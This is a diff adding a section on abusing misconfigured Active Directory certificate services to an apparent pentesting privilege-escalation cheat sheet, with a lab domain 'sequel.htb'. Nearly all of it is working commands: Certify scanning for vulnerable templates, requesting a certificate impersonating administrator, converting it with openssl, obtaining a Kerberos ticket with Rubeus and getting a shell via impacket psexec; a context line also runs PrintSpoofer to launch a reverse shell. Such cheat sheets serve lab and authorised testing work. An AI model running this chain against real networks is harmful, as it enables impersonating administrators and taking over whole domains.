@@ -626,6 +626,34 @@ For later versions use Rogue Potato.
 .\PrintSpoofer.exe -i -c "c:\Temp\rev_shell.exe"
 ```
 
+### Certificate exploits
+
+* PKI might badly configured
+* exploit it using Certify.exe tool for recon and certificate forging
+
+```bash
+# see github for more info
+Certify.exe find /vulnerable
+
+#altname is the account for impersonation
+.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
+
+#Copy the  -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- section to a file on Linux/macOS, and run the openssl #command to convert it to a .pfx. When prompted, don't enter a password:
+
+
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx
+
+#saving blob to ticket.64
+
+tr -d '\n' < ticket.64 | tr -d ' '
+
+# then just use ccache and call impackets psexec
+impacket-psexe -no-pass -k target cmd
+
+
+```
 
 ### Kernel Exploits
 
